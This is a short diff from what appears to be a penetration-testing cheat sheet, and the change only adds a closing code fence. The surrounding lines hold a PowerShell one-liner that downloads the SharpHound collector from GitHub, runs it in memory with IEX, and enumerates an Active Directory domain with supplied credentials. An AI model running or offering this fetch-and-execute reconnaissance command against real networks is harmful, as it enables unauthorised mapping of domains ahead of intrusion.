@@ -9,7 +9,7 @@ sudo chmod +x $(find /PATH/)
 ##### BloodHound ingestor trough PowerShell
 ~~~
 IEX(New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1');Invoke-BloodHound -LdapUsername "Username" -LdapPassword "Password" -Domain "Domain" -DomainController DC-ip -CollectionMethods All -OutputDirectory "C:\TEMP\"
-
+~~~
 
 
 # Bypasses
